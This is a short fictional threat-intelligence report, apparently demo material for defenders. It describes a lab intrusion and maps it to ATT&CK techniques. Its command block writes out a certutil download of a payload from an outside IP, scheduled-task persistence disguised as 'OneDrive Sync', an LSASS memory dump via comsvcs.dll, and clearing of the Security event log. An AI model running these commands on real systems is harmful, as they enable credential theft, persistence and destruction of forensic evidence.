# FIN-X intrusion: fictional CTI report for the ANVIL demo

*Fictional report written for the ANVIL demo. It uses documentation IP ranges (RFC 5737) and lab host names only.*

## Summary
In the lab exercise, the actor got initial access through a phishing document. They staged tooling with built-in Windows binaries (T1105), persisted with a scheduled task (T1053.005) and dumped credentials from LSASS (T1003.001).

## Observed commands

```
C:\> certutil.exe -urlcache -split -f http://198.51.100.23/update.bin C:\Users\Public\svc.exe
C:\> schtasks /create /sc minute /mo 30 /tn "OneDrive Sync" /tr C:\Users\Public\svc.exe /f
C:\> rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Users\Public\l.dmp full
C:\> wevtutil cl Security
```

They then loaded PowerShell tooling in memory and ran Invoke-Mimikatz and Get-DomainUser.

## IOCs (do not detect on these alone)
- 198.51.100.23
- svc.exe SHA256 0000000000000000000000000000000000000000000000000000000000000000
